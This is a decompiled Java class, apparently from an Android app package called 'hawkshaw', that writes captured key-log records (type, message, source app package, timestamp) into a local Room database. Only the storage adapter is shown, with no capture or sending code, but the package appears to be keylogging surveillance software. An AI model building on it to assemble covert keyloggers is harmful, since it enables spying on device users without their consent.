package com.hawkshaw.library.datalayer.room.keylogger;

import V.h;
import androidx.room.A;
import androidx.room.j;

public final class c extends j {

    /* renamed from: d  reason: collision with root package name */
    public final /* synthetic */ KeyLoggerDao_Impl f4943d;

    /* JADX INFO: super call moved to the top of the method (can break code semantics) */
    public c(KeyLoggerDao_Impl keyLoggerDao_Impl, A a5) {
        super(a5);
        this.f4943d = keyLoggerDao_Impl;
    }

    public final String b() {
        return "INSERT OR REPLACE INTO `KeyLogEntity` (`type`,`message`,`package_name`,`timestamp`,`id`) VALUES (?,?,?,?,nullif(?, 0))";
    }

    public final void d(h hVar, Object obj) {
        KeyLogEntity keyLogEntity = (KeyLogEntity) obj;
        hVar.I(1, this.f4943d.__Type_enumToString(keyLogEntity.getType()));
        hVar.I(2, keyLogEntity.getMessage());
        hVar.I(3, keyLogEntity.getPackageName());
        hVar.L(4, keyLogEntity.getTimestamp());
        hVar.L(5, (long) keyLogEntity.getId());
    }
}
